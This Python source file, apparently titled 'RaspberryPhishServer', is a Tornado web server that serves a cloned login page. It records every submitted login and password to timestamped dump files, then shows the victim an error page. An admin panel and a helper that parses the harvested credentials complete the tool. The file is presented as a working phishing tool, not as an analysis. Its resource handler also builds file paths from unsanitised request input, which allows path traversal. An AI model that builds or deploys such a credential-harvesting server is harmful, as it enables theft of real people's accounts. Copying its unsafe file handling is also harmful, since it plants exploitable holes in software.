#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os
import ssl
import time
import tornado.ioloop, tornado.web
from tornado import gen
from API.APIHandler import APIHandler


__title__ = "RaspberryPhishServer"


# var : directory name where the server will load in "pages" and "rsc"
pagePath = "test/"


def liste_dump(folder):
    dico = {}
    for root, dirs, files in os.walk(folder):
        for dump in files:
            path = "./" + root + "/" + dump
            dico[dump] = open(path).read().replace("login:", "").replace("password:", "").split("\n")[:-1]
    return dico


# Handler for ressources
class RscHandler(tornado.web.RequestHandler):
    @tornado.web.asynchronous
    #@gen.coroutine
    async def get(self, path_request):
        if str(path_request).endswith(".css"):
            self.set_header("Content-Type", "text/css; charset=UTF-8")
        self.write(open("rsc/" + path_request, 'rb').read())


class AdminHandler(tornado.web.RequestHandler):
    @tornado.web.asynchronous
    #@gen.coroutine
    async def get(self):
        self.render("pages/admin/index.html")

    def post(self):
        try:
            action = self.get_argument("action")
            print("action :", action)
        except tornado.web.HTTPError:   # no or wrong arguments
            pass
        self.render("pages/admin/index.html")


# Handler for HTML files
class MainHandler(tornado.web.RequestHandler):
    @tornado.web.asynchronous
    #@gen.coroutine
    async def get(self):
        self.render("pages/" + pagePath + "index.html")

    def post(self):
        try:
            login = self.get_argument("login")
            password = self.get_argument("password")
            try:
                if not os.path.exists("logs/dump/" + pagePath):
                    os.mkdir("logs/dump/" + pagePath)
                file = open("logs/dump/" + pagePath + str(time.time()), mode="a+")
                file.write("login:" + login + "\npassword:" + password + "\n")
                file.close()
            except IOError:
                print(pagePath)
                print("login :", login)
                print("password :", password)
        except tornado.web.HTTPError:   # no or wrong arguments
            pass
        # show an error page to the client
        self.render("pages/" + pagePath + "error.html")


def main():
    application = tornado.web.Application(
        [
            (r'/admin/rsc/(.*)', tornado.web.StaticFileHandler, {'path': 'rsc/'}),
            (r"/admin", AdminHandler),
            (r"/admin/.*", AdminHandler),
            (r"/API/(.*)$", APIHandler),
            (r'/rsc/(.*)', tornado.web.StaticFileHandler, {'path': 'rsc/'}),
            (r"/", MainHandler),
            (r"/.*", MainHandler),
        ],
        autoreload=True,
        #~ debug=True
    )   # create an instance

    if(os.path.isfile("cert/" + pagePath + "default.key") and
       os.path.isfile("cert/" + pagePath + "default.cert")):
        # bind https port
        application.listen(4430, ssl_options={"certfile": os.path.join("cert/" + pagePath + "default.cert"), "keyfile": os.path.join("cert/" + pagePath + "default.key"), "cert_reqs": ssl.CERT_OPTIONAL})


    # bind http port
    application.listen(8080)
    # loop forever for satisfy user's requests
    tornado.ioloop.IOLoop.current().start()


if __name__ == "__main__":
    main()
